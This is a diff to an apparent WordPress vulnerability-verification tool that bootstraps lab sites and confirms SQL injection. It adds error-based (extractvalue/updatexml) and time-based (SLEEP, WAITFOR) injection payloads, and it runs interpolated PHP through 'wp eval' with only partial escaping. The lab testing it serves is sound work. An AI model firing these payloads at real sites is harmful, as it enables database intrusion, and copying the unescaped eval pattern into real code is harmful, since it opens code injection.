@@ -1504,9 +1504,22 @@ def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: Wp
             value = (opt or {}).get("value", "1")
             patch_key = (opt or {}).get("patch_key") if isinstance(opt, dict) else None
             if patch_key:
-                # Nested option: wp option patch insert <option> <key> <value>
+                # Nested option: use wp eval for a reliable PHP-native upsert.
+                # 'patch insert' fails silently when the key already exists (plugins
+                # often set defaults on activation), and 'patch update' fails when
+                # the key doesn't exist yet.  A direct PHP eval handles both cases
+                # and also guarantees the exact PHP type we want (string 'true',
+                # not JSON-decoded bool true).
+                _php_val = str(value).replace("'", "\\'")
+                _php = (
+                    f"$_opts = get_option('{name}', []); "
+                    f"if (!is_array($_opts)) $_opts = []; "
+                    f"$_opts['{patch_key}'] = '{_php_val}'; "
+                    f"update_option('{name}', $_opts); "
+                    f"echo get_option('{name}')['{patch_key}'];"
+                )
                 step(f"activando opcion anidada requerida '{name}[{patch_key}]'={value!r}...")
-                r_opt = lab.wp_cli("option", "patch", "insert", name, patch_key, str(value), timeout=30)
+                r_opt = lab.wp_cli("eval", _php, timeout=30)
             else:
                 step(f"activando opcion requerida '{name}'={value!r} (el codigo vulnerable solo se "
                      f"usa con esta activada)...")
@@ -3127,6 +3140,15 @@ def verify_wordpress_sqli(
         step("probando error-based (extractvalue/updatexml) para extraer version() real...")
         error_tried = []
         error_found = None
+        # Standard payloads: inject with comment suffix (works when '--' doesn't break outer grouping)
+        # BETWEEN-safe payloads: no comment, closed with AND '1 so the multi-BETWEEN structure stays
+        # syntactically valid across multiple occurrences of $param in one query (e.g. My Calendar).
+        error_payloads_extra = [
+            (f"{orig_value}' AND extractvalue(1,concat(0x7e,version())) AND '1",),
+            (f"{orig_value}' AND updatexml(1,concat(0x7e,version()),1) AND '1",),
+            (f"{orig_value}') AND extractvalue(1,concat(0x7e,version())) AND ('1",),
+            (f"{orig_value}') AND updatexml(1,concat(0x7e,version()),1) AND ('1",),
+        ]
         for ctx in contexts:
             for fn in ("extractvalue(1,concat(0x7e,version()))", "updatexml(1,concat(0x7e,version()),1)"):
                 for cm in comments:
@@ -3147,6 +3169,21 @@ def verify_wordpress_sqli(
                     break
             if error_found:
                 break
+        # BETWEEN-safe no-comment variants (try after the standard set)
+        if not error_found:
+            for (payload_val,) in error_payloads_extra:
+                try:
+                    r = send(payload_val)
+                except Exception as e:
+                    error_tried.append({"payload": payload_val, "error": str(e)})
+                    continue
+                new_versions = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "")) - version_noise
+                error_tried.append({"payload": payload_val, "status": r.status_code,
+                                    "version_nueva": sorted(new_versions),
+                                    "respuesta_cuerpo_recorte": (r.text or "")[:300]})
+                if new_versions:
+                    error_found = (payload_val, sorted(new_versions)[0], r)
+                    break
 
         if error_found:
             payload_val, mysql_version, r = error_found
@@ -3303,8 +3340,10 @@ def verify_wordpress_sqli(
             (f"{orig_value}';WAITFOR DELAY '0:0:5'--", f"{orig_value}';WAITFOR DELAY '0:0:0'--"),
             (f"{orig_value});WAITFOR DELAY '0:0:5'--", f"{orig_value});WAITFOR DELAY '0:0:0'--"),
             # BETWEEN-context: avoids '--' that breaks unclosed string literals inside SQL functions.
+            # Uses orig_value (not hardcoded '1') so the date is valid and MySQL evaluates the
+            # WHERE clause instead of short-circuiting on an invalid date bound.
             # Works in: BETWEEN '$from X' AND '$to Y', DATE('$from'), and standard WHERE '$col'.
-            (f"1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1", f"1' AND (SELECT 1 FROM (SELECT(SLEEP(0)))a) AND '1"),
+            (f"{orig_value}' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1", f"{orig_value}' AND (SELECT 1 FROM (SELECT(SLEEP(0)))a) AND '1"),
             # IN()-numeric context: no trailing comment because '--' would comment out the closing ')'.
             # Works in: WHERE col IN ($value) when value is used without quotes.
             (f"{orig_value} AND SLEEP(5)", f"{orig_value} AND SLEEP(0)"),
